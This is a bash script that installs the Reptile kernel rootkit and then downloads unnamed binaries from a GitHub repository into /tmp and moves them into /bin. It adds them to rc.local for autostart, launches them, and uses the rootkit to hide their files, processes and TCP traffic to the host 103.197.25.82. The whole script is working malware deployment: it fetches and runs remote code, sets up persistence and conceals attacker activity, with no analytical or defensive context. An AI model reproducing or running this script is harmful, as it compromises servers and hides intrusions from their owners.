#!/bin/bash
#
#install rookit###################

wget https://raw.githubusercontent.com/myvulweb/b3/master/rm.zip -O /tmp/mrp.zip
cd /tmp
unzip mrp.zip
cd Reptile-master
chmod 777 setup.sh
./setup.sh install

#install end#####################

#down and checkmd5
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxd -O /tmp/lainudxd
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxt -O /tmp/lainudxt
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-home -O /tmp/lainudx-home
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-ver.txt -O /tmp/lainudx-ver.txt
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-update.sh -O /tmp/lainudx-update.sh
wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-startup.sh -O /tmp/lainudx-startup.sh
wget https://raw.githubusercontent.com/myvulweb/b3/master/md5 -O /tmp/mymd5

check1=`cat /tmp/mymd5 | grep \`md5sum /tmp/lainudxt | cut -d " " -f1\``
check2=`cat /tmp/mymd5 | grep \`md5sum /tmp/lainudxd | cut -d " " -f1\``
check3=`cat /tmp/mymd5 | grep \`md5sum /tmp/lainudx-home | cut -d " " -f1\``
#check4=`cat /tmp/mymd5 | grep \`md5sum /tmp/lainudx-ver.txt | cut -d " " -f1\``


rm -rf /tmp/mymd5

if [[ "$check1" = "" || "$check2" = "" || "$check3" = "" ]]
then
  echo "check1"
  echo $check1
  echo "check2"
  echo $check2
  echo "check3"
  echo $check3
  echo "check4"
  echo $check4
  echo "down error!"
  exit 2
fi

#uninstall start
sed -i '\/bin\/linudx-home/d' /etc/rc.d/rc.local

#show###############################
/linudx/linudx_cmd show
if [ "`ls /bin | grep linudx`" ];then
  echo "show success check one"
else
  /linudx/linudx_cmd show
fi

if [ "`ls /bin | grep linudx`" ];then
  echo "show  success check two" 
else
  echo "show  failed"
fi
#show end###########################

  
killall linudxd
killall linudxt
killall linudx-home

rm -rf /bin/linudxd
rm -rf /bin/linudxt
rm -rf /bin/linudx-home
rm -rf /bin/linudx-update.sh
rm -rf /bin/linudx-ver.txt
rm -rf /bin/linudx-startup.sh

#uninstall finish

#copy files to /bin
mv /tmp/lainudxd /bin/linudxd
mv /tmp/lainudxt /bin/linudxt
mv /tmp/lainudx-home /bin/linudx-home
mv /tmp/lainudx-update.sh /bin/linudx-update.sh
mv /tmp/lainudx-startup.sh /bin/linudx-startup.sh
mv /tmp/lainudx-ver.txt /bin/linudx-ver.txt

#add autorun for centos

echo '/bin/linudx-home'>>/etc/rc.d/rc.local

chmod 777 /bin/linudxd
chmod 777 /bin/linudxt
chmod 777 /bin/linudx-home
chmod 777 /bin/linudx-update.sh
chmod 777 /bin/linudx-startup.sh

/bin/linudxd &
/bin/linudxt &
/bin/linudx-home &

p1=`pidof linudxd`
p2=`pidof linudxt`
p3=`pidof linudx-home`

#hide###########################
/linudx/linudx_cmd hide
if [ "`ls /bin | grep linudx`" ];then
  /linudx/linudx_cmd hide 
else
  echo "hide success check1"
fi

if [ "`ls /bin | grep linudx`" ];then
  echo "hide failed" 
else
  echo "hide success check2"
fi
#hide end########################

#hide pid and files
/linudx/linudx_cmd hide $p1
/linudx/linudx_cmd hide $p2
/linudx/linudx_cmd hide $p3
/linudx/linudx_cmd tcp 103.197.25.82 80 hide

